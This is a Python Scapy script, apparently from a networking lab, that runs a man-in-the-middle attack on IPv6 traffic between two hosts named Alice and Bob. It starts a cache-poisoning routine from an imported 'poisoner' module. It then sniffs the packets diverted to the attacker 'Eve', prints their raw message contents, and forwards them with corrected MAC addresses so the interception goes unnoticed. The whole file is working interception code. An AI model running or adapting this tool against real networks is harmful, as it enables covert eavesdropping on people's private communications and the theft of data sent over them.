from scapy.all import *
from network_details import *
from threading import Thread
import poisoner

def fix_and_send(pkt):
    """
:   The function receives a packet that was
:   diverted from its path and reached the
:   attack due to the poisoning of the cache memory,
:   so it repairs the packet by
:   setting the correct destination and send it.
:   param pkt: the packet..
:   type pkt: scapy packet
:   rtype: None
    """
    if pkt[Ether].src == ALICE_MAC:
        pkt[Ether].dst = BOB_MAC
    else:
        pkt[Ether].dst = ALICE_MAC
    
    sendp(pkt, verbose=0)


def printConversation(pkt):
    """
:   print the msg inside the packet if have,
:   and send it to the right side.
:   param pkt: the packet
:   type pkt: scapy packet
:   rtype: None.
    """
    # print the msg and src name.
    if Raw in pkt:
        content = pkt[Raw].load.decode()
        if pkt[Ether].src == ALICE_MAC:
            print("Alice: " + content)
        else:
            print("Bob: " + content)
    
    # fix packet and send to right side
    fix_and_send(pkt)


def AliceAndBobConnect(pkt):
    """
:   function filter just packets from
:   Alice to Bob and vise versa
:   param pkt: packet from sniffing
:   type pkt: acapy packet
:   return: True if pkt pass the filter.
:   rtype: bool
    """
    return Ether in pkt and IPv6 in pkt and\
    ((pkt[Ether].src == ALICE_MAC and\
    pkt[Ether].dst == EVE_MAC and\
    pkt[IPv6].src == ALICE_IPv6 and\
    pkt[IPv6].dst == BOB_IPv6)\
    or\
    (pkt[Ether].src == BOB_MAC and\
    pkt[Ether].dst == EVE_MAC and\
    pkt[IPv6].src == BOB_IPv6 and\
    pkt[IPv6].dst == ALICE_IPv6))


def main():
    """
:   function poison two sides (Alice and Bob),
:   and after that sniff the transport and print
:   Raw msg to the screen.
    """
    # poison
    Thread(target=poisoner.poison, args=()).start()    
    
    # and start listening to Alice & Bob conversation
    sniff(lfilter=AliceAndBobConnect, prn=printConversation)
    
    
if __name__ == "__main__":
    main()
    
